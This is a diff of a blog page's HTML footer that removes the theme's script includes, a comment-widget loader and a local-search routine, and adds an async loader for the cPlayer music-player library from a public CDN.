-  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-
-  
-  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
-
-
-
-  
-  
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-  
-    <script type="text/javascript">
-      (function(d, s) {
-        var j, e = d.getElementsByTagName(s)[0];
-        if (typeof LivereTower === 'function') { return; }
-        j = d.createElement(s);
-        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-        j.async = true;
-        e.parentNode.insertBefore(j, e);
-      })(document, 'script');
-    </script>
-  
-
-
-
-
-
-
-  
-
-  <script type="text/javascript">
-    // Popup Window;
-    var isfetched = false;
-    // Search DB path;
-    var search_path = "search.xml";
-    if (search_path.length == 0) {
-      search_path = "search.xml";
-    }
-    var path = "/" + search_path;
-    // monitor main search box;
-
-    function proceedsearch() {
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
-        .css('overflow', 'hidden');
-      $('.popup').toggle();
-    }
-    // search function;
-    var searchFunc = function(path, search_id, content_id) {
-      'use strict';
-      $.ajax({
-        url: path,
-        dataType: "xml",
-        async: true,
-        success: function( xmlResponse ) {
-          // get the contents from search data
-          isfetched = true;
-          $('.popup').detach().appendTo('.header-inner');
-          var datas = $( "entry", xmlResponse ).map(function() {
-            return {
-              title: $( "title", this ).text(),
-              content: $("content",this).text(),
-              url: $( "url" , this).text()
-            };
-          }).get();
-          var $input = document.getElementById(search_id);
-          var $resultContent = document.getElementById(content_id);
-          $input.addEventListener('input', function(){
-            var matchcounts = 0;
-            var str='<ul class=\"search-result-list\">';
-            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-            $resultContent.innerHTML = "";
-            if (this.value.trim().length > 1) {
-              // perform local searching
-              datas.forEach(function(data) {
-                var isMatch = false;
-                var content_index = [];
-                var data_title = data.title.trim().toLowerCase();
-                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
-                var data_url = decodeURIComponent(data.url);
-                var index_title = -1;
-                var index_content = -1;
-                var first_occur = -1;
-                // only match artiles with not empty titles and contents
-                if(data_title != '') {
-                  keywords.forEach(function(keyword, i) {
-                    index_title = data_title.indexOf(keyword);
-                    index_content = data_content.indexOf(keyword);
-                    if( index_title >= 0 || index_content >= 0 ){
-                      isMatch = true;
-                      if (i == 0) {
-                        first_occur = index_content;
-                      }
-                    }
-
-                  });
-                }
-                // show search results
-                if (isMatch) {
-                  matchcounts += 1;
-                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
-                  var content = data.content.trim().replace(/<[^>]+>/g,"");
-                  if (first_occur >= 0) {
-                    // cut out 100 characters
-                    var start = first_occur - 20;
-                    var end = first_occur + 80;
-                    if(start < 0){
-                      start = 0;
-                    }
-                    if(start == 0){
-                      end = 50;
-                    }
-                    if(end > content.length){
-                      end = content.length;
-                    }
-                    var match_content = content.substring(start, end);
-                    // highlight all keywords
-                    keywords.forEach(function(keyword){
-                      var regS = new RegExp(keyword, "gi");
-                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
-                    });
-
-                    str += "<p class=\"search-result\">" + match_content +"...</p>"
-                  }
-                  str += "</li>";
-                }
-              })};
-            str += "</ul>";
-            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
-            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
-            $resultContent.innerHTML = str;
-          });
-          proceedsearch();
+<script async>
+"use strict";
+(function(){
+var cp = function(){
+    var len = cPlayerOptions.length;
+    for(var i=0;i<len;i++){
+        var element = document.getElementById('player' + cPlayerOptions[i]['id'])
+        while (element.hasChildNodes()) {
+            element.removeChild(element.firstChild);
+        };
+        cPlayers[i] = new cPlayer({
+            element: element,
+            list: cPlayerOptions[i]['list'],
+            });
+    };
+    cPlayers = [];cPlayerOptions = [];
+};
+var script = document.createElement('script');
+script.type = "text/javascript";
+script.src = "https://cdn.bootcss.com/cplayer/3.2.1/cplayer.js";
+script.async = true;
+if(script.readyState){  
+    script.onreadystatechange = function(){
+        if (script.readyState == "loaded" ||
+            script.readyState == "complete"){
+            script.onreadystatechange = null;
+            cp();
         }
-      });}
+    };
+}else{  
+    script.onload = function(){
+        cp();
+    };
+}
+document.head.appendChild(script);
+})();
+</script>
 
-    // handle and trigger popup window;
-    $('.popup-trigger').click(function(e) {
-      e.stopPropagation();
-      if (isfetched == false) {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      } else {
-        proceedsearch();
-      };
-    });
-
-    $('.popup-btn-close').click(function(e){
-      $('.popup').hide();
-      $(".local-search-pop-overlay").remove();
-      $('body').css('overflow', '');
-    });
-    $('.popup').click(function(e){
-      e.stopPropagation();
-    });
-  </script>
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-
-</body>
+    </body>
 </html>
